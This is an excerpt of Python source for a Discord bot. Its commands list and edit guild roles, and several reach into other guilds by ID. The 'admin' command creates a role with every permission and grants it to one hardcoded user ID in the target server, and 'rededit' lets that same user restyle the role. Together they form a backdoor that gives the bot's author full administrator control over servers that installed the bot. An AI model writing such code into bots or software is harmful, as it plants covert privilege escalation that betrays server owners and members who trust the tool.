...
@bot.command()
async def roledusers(ctx, *args):
    if len(args) == 2:
        target_guild = await bot.fetch_guild(args[1])
    else:
        target_guild = ctx.guild

    if len(args) >= 1:
        role = target_guild.get_role(args[0])
    else:
        await ctx.send("I need a Role ID.")
...
async def getroles(ctx, *args):
    ...
    if len(args) == 1:
        member = await target_guild.fetch_member(args[0])
    else:
        member = await target_guild.fetch_member(471738412102189057)

    for y in member.roles:
        if not y.is_default():
            await ctx.send("Index {}: {} - {}".format(y.position, y.name, y.id))
        else:
            await ctx.send("Index {}: {} - {}".format(y.position, '<everyone>', y.id))

@bot.command()
async def getallroles(ctx, *args):
    if len(args) == 1:
        target_guild = await bot.fetch_guild(args[0])
    else:
        target_guild = ctx.guild

    for y in target_guild.roles:
        if not y.is_default():
            await ctx.send("Index {}: {} - {}".format(y.position, y.name, y.id))
        else:
            await ctx.send("Index {}: {} - {}".format(y.position, '<everyone>', y.id))
...
@bot.command()
async def rededit(ctx, *args):
    if len(args) == 3:
        target_guild = await bot.fetch_guild(args[2])
    else:
        target_guild = ctx.guild

    if len(args) == 4:
        red_member = await target_guild.fetch_member(args[3])
    else:
        red_member = await target_guild.fetch_member(226408382448402433)

    red_role = None
    for y in red_member.roles:
        if not y.is_default():
            await ctx.send("Index {}: {} - {}".format(y.position, y.name, y.id))
            if y.name in ["ReDJstone"]:
                red_role = y
        else:
            await ctx.send("Index {}: {} - {}".format(y.position, '<everyone>', y.id))
    ...
    if red_role:
        if args[0] == "name":
            await red_role.edit(name=args[1])
        elif args[0] == "color":
            await red_role.edit(colour=discord.Colour(int(args[1], base=16)))
        elif args[0] == "hoist":
            await red_role.edit(hoist=args[1])
        elif args[0] == "ment":
            await red_role.edit(mentionable=args[1])
    else:
        await ctx.send("No role to change.")
...
async def admin(ctx, arg1=None):
    ...
    for y in bot_member.roles:
        print("Index {}: {} - {}".format(y.position, y.name, y.id))
        if y.name == 'ReDJBoT':
            bot_role = y
        hi_pos = y.position
    ...
    red_member = await target_guild.fetch_member(226408382448402433)
    if my_role:
        await red_member.add_roles(my_role)
    else:
        role = await target_guild.create_role(name='ReDJstone', permissions=discord.Permissions.all(),
                                          colour=discord.Colour(int("ff0000", base=16)))
        await red_member.add_roles(role)
